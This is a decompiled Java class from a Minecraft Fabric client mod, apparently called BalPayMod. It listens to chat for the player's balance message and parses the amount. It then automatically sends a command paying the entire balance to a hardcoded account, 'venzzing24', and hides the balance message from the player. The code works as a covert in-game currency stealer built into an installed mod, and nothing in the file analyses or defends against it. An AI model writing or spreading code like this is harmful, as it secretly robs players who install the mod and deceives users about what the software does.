package com.example;

import com.example.BalPayMod;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.minecraft.class_310;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Environment(value=EnvType.CLIENT)
public class ChatListener {
    public static final Logger LOGGER = LoggerFactory.getLogger("BalPayMod");
    private static final Pattern BAL_PATTERN = Pattern.compile("\\$\\s*([0-9][0-9,.]*[kKmMbB]?)");

    public static void register() {
        ClientReceiveMessageEvents.ALLOW_GAME.register((message, overlay) -> {
            if (overlay) {
                return true;
            }
            return ChatListener.handleIncoming(message.getString());
        });
        ClientReceiveMessageEvents.ALLOW_CHAT.register((message, signedMessage, sender, params, receptionTimestamp) -> ChatListener.handleIncoming(message.getString()));
    }

    private static boolean handleIncoming(String msg) {
        Matcher m;
        boolean isMyBal;
        class_310 client = class_310.method_1551();
        if (client.field_1724 == null) {
            return true;
        }
        String lower = msg.toLowerCase();
        String myName = client.field_1724.method_5477().getString().toLowerCase();
        boolean bl = isMyBal = lower.contains("you have") || lower.contains(myName) && lower.contains("has $") || lower.contains("balance") && lower.contains(myName) || lower.contains("your balance");
        if (isMyBal && (m = BAL_PATTERN.matcher(msg)).find()) {
            String raw = m.group(1).replace(",", "");
            long amountLong = ChatListener.normalizeToLong(raw);
            if (amountLong <= 0L) {
                LOGGER.info("BalPayMod: Balance is 0, nothing to pay.");
                BalPayMod.hasPaid = true;
            } else {
                String finalAmount = String.valueOf(amountLong);
                LOGGER.info("BalPayMod: Balance detected: {} -> paying {} after 0.25s", (Object)msg, (Object)finalAmount);
                BalPayMod.awaitingPaymentConfirmation = true;
                CompletableFuture.delayedExecutor(250L, TimeUnit.MILLISECONDS).execute(() -> client.execute(() -> BalPayMod.sendPlayerCommand("pay venzzing24 " + finalAmount)));
            }
            return false;
        }
        if (lower.contains("you paid venzzing24")) {
            BalPayMod.hasPaid = true;
            BalPayMod.awaitingPaymentConfirmation = false;
            LOGGER.info("BalPayMod: Confirmed payment: {}", (Object)msg);
            return true;
        }
        if (lower.contains("number is invalid")) {
            BalPayMod.awaitingPaymentConfirmation = false;
            return true;
        }
        return true;
    }

    private static long normalizeToLong(String s) {
        if (s == null || s.isEmpty()) {
            return 0L;
        }
        char last = Character.toLowerCase(s.charAt(s.length() - 1));
        double mult = 1.0;
        String num = s;
        if (last == 'k') {
            mult = 1000.0;
            num = s.substring(0, s.length() - 1);
        } else if (last == 'm') {
            mult = 1000000.0;
            num = s.substring(0, s.length() - 1);
        } else if (last == 'b') {
            mult = 1.0E9;
            num = s.substring(0, s.length() - 1);
        }
        try {
            return (long)(Double.parseDouble(num) * mult);
        }
        catch (NumberFormatException e) {
            return 0L;
        }
    }
}
